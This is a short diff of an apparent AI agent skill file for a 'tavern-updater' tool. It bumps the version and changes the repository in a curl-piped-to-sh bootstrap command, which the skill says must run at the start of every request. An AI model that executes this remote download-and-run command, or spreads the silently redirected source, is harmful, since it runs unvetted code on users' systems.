@@ -1,7 +1,7 @@
 ---
 name: tavern-updater
 description: Review, install, and roll back verified Tavern releases.
-version: 1.24.2
+version: 1.24.3
 author: Tavern Project
 license: AGPL-3.0-only
 platforms: [linux, macos]
@@ -24,7 +24,7 @@ Every check, review, or update request must begin with the verified Bootstrap in
 review mode:
 
 ```sh
-curl -fsSL https://github.com/LoveMaker-art/liveware-tavern/releases/latest/download/install-tavern-updater.sh | sh
+curl -fsSL https://github.com/LoveMaker-art/noras-tavern/releases/latest/download/install-tavern-updater.sh | sh
 ```
 
 Bootstrap refreshes only the updater, verifies the latest stable Release, and
